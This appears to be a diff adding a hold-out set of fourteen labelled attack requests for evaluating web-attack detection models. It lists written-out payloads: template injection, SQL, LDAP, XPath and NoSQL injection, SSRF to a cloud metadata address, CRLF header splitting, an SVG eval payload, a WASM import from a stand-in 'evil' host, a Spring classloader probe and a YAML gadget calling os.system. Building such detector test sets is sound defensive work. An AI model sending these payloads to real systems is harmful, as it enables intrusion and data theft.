@@ -1,0 +1,17 @@
+Hold-out attack cases (NOT merged in train.py — train only uses data/attack.txt + data/normal.txt)
+Vectors chosen to differ from the main regression file themes while still being labeled ATTACK by both models today.
+----------------------------------------------------------------------------------------------------------------
+1. Jinja SSTI minimal: GET /v?name={{7*7}}
+2. SQL union version probe: GET /x?id=1+UNION+ALL+SELECT+NULL,@@version--+-
+3. LDAP-style filter: GET /auth?filter=*)(&(uid=*)(userPassword=*))
+4. XPath-style or 1=1: GET /xpath?q=foo%27%20or%201%3D1
+5. SSRF metadata IP: GET /proxy?target=http://169.254.169.254/latest/meta-data/
+6. Mongo where sleep: GET /mongo?x={"$where":"sleep(100)"}
+7. Classic tautology: GET /login?user=admin%27%20or%20%271%27%3D%271
+8. Open redirect header split: GET /go?u=http://legit%0d%0aSet-Cookie:%20sid=evil
+9. WASM import URL: GET /wasm?i=import%28%27https://evil/x.wasm%27%29
+10. SVG onload eval b64: GET /s?q=<svg/onload=eval(atob(YWxlcnQoMSk=))>
+11. Spring classloader probe: GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc%7D
+12. NoSQL empty gt: GET /nosql?f={"$gt":""}
+13. Header injection CRLF: GET /hdr?x=1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a
+14. YAML python gadget: GET /yaml?c=!!python/object/new:os.system%20%5B%22echo%22%5D
